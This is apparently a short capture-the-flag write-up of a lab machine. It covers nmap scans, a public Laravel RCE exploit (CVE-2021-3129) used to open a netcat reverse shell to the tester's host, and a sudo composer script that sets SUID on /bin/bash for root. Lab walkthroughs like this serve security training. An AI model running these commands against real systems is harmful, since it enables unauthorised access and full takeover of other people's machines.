# nmap
```
┌──(kali㉿kali)-[~/PG┌──(kali㉿kali)-[~/PG/lavita]
└─$ nmap -p- --min-rate 10000 192.168.115.38            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-23 20:13 EST
Nmap scan report for 192.168.115.38
Host is up (0.050s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
8516/tcp  filtered unknown
16200/tcp filtered unknown
62106/tcp filtered unknown
62415/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 7.85 seconds
                                                                                                                                              
┌──(kali㉿kali)-[~/PG/lavita]
└─$ nmap -p 22,80 -sCV 192.168.115.38                   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-23 20:14 EST
Nmap scan report for 192.168.115.38
Host is up (0.044s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: W3.CSS Template
|_http-server-header: Apache/2.4.56 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.86 seconds
```
![Pasted image 20250224091644](<0. Attachments/Pasted image 20250224091644.png>)

# web enum
![Pasted image 20250224091742](<0. Attachments/Pasted image 20250224091742.png>)

after registering
![Pasted image 20250224092122](<0. Attachments/Pasted image 20250224092122.png>)

# exploit
[GitHub - joshuavanderpoll/CVE-2021-3129: Laravel RCE Exploit Script - CVE-2021-3129](https://github.com/joshuavanderpoll/CVE-2021-3129)
![Pasted image 20250224093445](<0. Attachments/Pasted image 20250224093445.png>)

# initial access
![Pasted image 20250224094732](<0. Attachments/Pasted image 20250224094732.png>)

```
python3 CVE-2021-3129.py
http://192.168.115.38/
execute nc 192.168.45.203 4444 -e /bin/bash
```

![Pasted image 20250224094826](<0. Attachments/Pasted image 20250224094826.png>)

# local.txt
![Pasted image 20250224095031](<0. Attachments/Pasted image 20250224095031.png>)

# priv esc enum

![Pasted image 20250224095525](<0. Attachments/Pasted image 20250224095525.png>)

![Pasted image 20250224095601](<0. Attachments/Pasted image 20250224095601.png>)

![Pasted image 20250224100315](<0. Attachments/Pasted image 20250224100315.png>)

what is this artisan
![Pasted image 20250224100420](<0. Attachments/Pasted image 20250224100420.png>)

who is uid=1001?
![Pasted image 20250224100502](<0. Attachments/Pasted image 20250224100502.png>)
skunk the same one in a sudo group

# priv esc
![Pasted image 20250224101122](<0. Attachments/Pasted image 20250224101122.png>)

![Pasted image 20250224101217](<0. Attachments/Pasted image 20250224101217.png>)

# root priv esc enum
![Pasted image 20250224101302](<0. Attachments/Pasted image 20250224101302.png>)

![Pasted image 20250224101346](<0. Attachments/Pasted image 20250224101346.png>)

# root priv esc
![Pasted image 20250224101756](<0. Attachments/Pasted image 20250224101756.png>)

```
mv composer.json composer.json.original
{"scripts":{"x":"chmod +s /bin/bash"}}
```

![Pasted image 20250224101845](<0. Attachments/Pasted image 20250224101845.png>)
```
sudo -u root /usr/bin/composer --working-dir\=/var/www/html/lavita run-script x
```

# root.txt
![Pasted image 20250224102037](<0. Attachments/Pasted image 20250224102037.png>)

